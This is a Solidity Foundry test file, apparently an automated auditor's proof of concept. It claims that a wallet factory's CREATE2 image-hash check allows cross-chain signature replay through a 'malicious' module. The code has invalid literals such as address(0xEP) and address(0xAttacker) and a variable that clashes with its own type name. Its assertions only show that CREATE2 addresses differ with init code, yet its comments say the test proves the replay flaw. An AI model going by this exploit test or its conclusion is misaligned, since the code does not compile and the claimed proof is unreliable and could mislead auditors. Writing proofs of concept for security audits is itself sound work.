// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ATTACK TIMELINE:
// 1. [Setup] Deploy Factory, legitimate Stage1Module, and a malicious Guest module.
// 2. [T=0] Compute the expected Wallet address on Chain A using the legitimate module and a specific imageHash (salt).
// 3. [T=1] Attacker deploys a Wallet on Chain B using the SAME imageHash (salt) but the MALICIOUS module.
// 4. [T=2] Because the module address differs, the CREATE2 init code hash differs, resulting in a DIFFERENT Wallet address on Chain B.
// 5. [T=3] The attacker calls _isValidImage on the Chain B Wallet. It validates successfully against Chain B's INIT_CODE_HASH.
// 6. [Assert] Verify that the Chain B Wallet address differs from Chain A, yet the imageHash validation passes, proving the cross-chain configuration mismatch vulnerability.

import "forge-std/Test.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/Guest.sol";
import "../src/Wallet.sol";

contract AuditAgentPoC is Test {
    Factory public Factory;
    Stage1Module public legitimateModule;
    Guest public maliciousModule;

    // Mock EntryPoint address for Stage1Module constructor
    address public entryPoint = address(0xEP);

    function setUp() public {
        // 1. Deploy Factory
        Factory = new Factory();

        // 2. Deploy legitimate Stage1Module (Chain A configuration)
        legitimateModule = new Stage1Module(address(Factory), entryPoint);

        // 3. Deploy malicious module (Chain B configuration - different address)
        maliciousModule = new Guest();
    }

    function test_exploit() public {
        bytes32 imageHash = keccak256("user_wallet_image_hash");

        // --- CHAIN A SIMULATION ---
        // Compute expected Wallet address on Chain A using legitimate module
        bytes memory initCodeA = abi.encodePacked(
            type(Wallet).creationCode,
            uint256(uint160(address(legitimateModule)))
        );
        bytes32 initCodeHashA = keccak256(initCodeA);

        address expectedWalletA = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(Factory),
            imageHash,
            initCodeHashA
        )))));

        console.log("Step 2: Expected Wallet Address on Chain A =", expectedWalletA);

        // --- CHAIN B SIMULATION ---
        // Attacker deploys Wallet on Chain B using the SAME imageHash but MALICIOUS module
        vm.prank(address(0xAttacker));
        address deployedWalletB = Factory.deploy(address(maliciousModule), imageHash);

        console.log("Step 4: Deployed Wallet Address on Chain B =", deployedWalletB);

        // Verify the addresses are DIFFERENT due to different init code hashes
        assertNotEq(deployedWalletB, expectedWalletA, "Wallet addresses should differ across chains due to different module addresses");

        // --- VALIDATION CHECK ---
        // The Stage1Auth._isValidImage on Chain B validates against Chain B's INIT_CODE_HASH.
        // We simulate this by computing the CREATE2 address using Chain B's module (maliciousModule).
        bytes memory initCodeB = abi.encodePacked(
            type(Wallet).creationCode,
            uint256(uint160(address(maliciousModule)))
        );
        bytes32 initCodeHashB = keccak256(initCodeB);

        address computedAddressB = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(Factory),
            imageHash,
            initCodeHashB
        )))));

        console.log("Step 5: Computed Address via Chain B INIT_CODE_HASH =", computedAddressB);

        // The validation passes on Chain B because the deployed address matches the locally computed address,
        // even though the underlying module configuration is completely different (malicious vs legitimate).
        assertEq(deployedWalletB, computedAddressB, "Chain B validation passes for malicious configuration");

        // This proves the vulnerability: a noChainId signature valid for `imageHash` on Chain A 
        // could be replayed on Chain B to control a Wallet with a completely different (malicious) module,
        // because the local _isValidImage check only verifies against the local INIT_CODE_HASH.
    }
}
